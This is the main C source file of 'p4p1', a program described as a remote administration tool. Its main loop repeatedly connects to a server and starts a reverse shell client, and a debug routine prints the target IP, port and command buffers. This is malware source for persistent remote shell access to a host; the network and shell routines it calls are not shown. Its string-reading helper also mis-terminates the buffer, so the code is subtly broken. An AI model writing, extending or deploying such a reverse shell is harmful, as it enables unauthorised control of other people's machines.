/*
 *	File Name : main.c
 *	Description: main file source for p4p1
 *				- Made by Leo Smith
 *	Usage:
 *		./p4p1.exe
 *
 */

#include "main.h"
#include "header/win_api.h"
#include "header/setup.h"
#include "header/reverse.h"
#include "header/network.h"
#include "header/bin.h"

int main(int ac, char * av[])
{
	struct main_struct m_s;		// main structure for all of the variables

	setup(&m_s);			// setup the remote administration tool
	while(1) {
		#ifdef _DEBUG
		debug(&m_s);
		#endif
		cnt(&m_s);		// connect to server
		reverse_shell(&m_s);	// start the client handler
		close_cnt(&m_s);
	}
	return 0;
}

void error(char * msg)			// function used if errors occure
{
	perror(msg);
	exit(errno);
}

#ifdef _DEBUG
void debug(struct main_struct *ms)		// function to print out vars if needed
{
	system("dir");
	printf("-----------------------\n"
	"Connection status 0 = active\n"
	"cn = %d\n", ms->cn);
	printf("-----------------------\n"
	"all of variables\n"
	"port : %d\n"
	"ip : %s\n"
	"buf : %s\n"
	"cmd : %s\n", ms->port, ms->ip, ms->buf, ms->cmd);
}
#endif


void first_line_to_buffer(FILE * fp, char *buf)	// get the first line of a file and put
{						// it into a buffer
	int i;
	char c;

	i = c = 0;
	while( (c = fgetc(fp)) != EOF) {	// goes through the file
		if(c == '\n')			// until it hits a \n aka the first line
			break;
		buf[i++] = c;			// this is shorthand notation
	}					// just write the char to buf and increment
	buf[i+1] = '\0';			// i, here we terminate the created string
}
